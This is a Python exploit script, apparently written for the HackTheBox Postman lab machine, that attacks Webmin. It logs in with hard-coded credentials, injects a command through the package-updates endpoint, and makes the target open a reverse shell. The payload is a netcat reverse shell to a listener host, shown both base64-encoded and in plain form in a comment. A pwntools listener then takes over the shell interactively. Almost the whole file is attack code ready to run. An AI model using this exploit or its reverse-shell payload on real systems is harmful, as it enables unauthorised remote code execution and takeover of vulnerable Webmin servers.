#!/usr/bin/python3

# Exploit based on Postman machine from HacktheBox. 
# Code developed by the YouTube channel S4viOnLive. URL: https://www.youtube.com/watch?v=l3ZJSVurFGo&t=5912s

from pwn import *

import pdb
import urllib3
import html

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Global variables
IP_VICTIM = "10.0.2.31"
login_url = "https://"+IP_VICTIM+":10000/session_login.cgi"
package_updates_url = "https://"+IP_VICTIM+":10000/package-updates/update.cgi"

lport = 443

def makeRequest():
    # Disable SSL certificate verification
    urllib3.disable_warnings() # SSL    
    
    # Session to manage cookies
    s = requests.session()
    s.verify = False
    
    # Prepare data and header required in the fist POST request
    post_data = {
        'page': '',
        'user': 'it',
        'pass': 'ingenieros2021'
    }

    headers = {
        'Cookie': 'testing=1'
    }

    # Send the request to login in Webmin Dashboard
    r = s.post(login_url, data=post_data, headers=headers)
    
    # Prepare data and header required in the second POST request
    #echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_ATTACKER> 443 >/tmp/f" | base64 -w 0; echo
    post_data = [
        ('u', 'acl/apt'),
        ('u', ' | bash -c "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMC4yLjMyIDQ0MyA+L3RtcC9mCg= | base64 -d | sh"'),
        ('ok_top', 'Update Selected Packages')
    ]

    headers = {
        'Referer': 'https://'+IP_VICTIM+':10000/'
    }

    # Send the request to vulnerable url (package_update) to exec remote code
    r = s.post(package_updates_url, data=post_data, headers=headers)
    output = html.unescape(re.findall(r'<pre>(.*?)</pre>', r.text, re.DOTALL)[0]).strip()

    print(output)
if __name__ == '__main__':

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
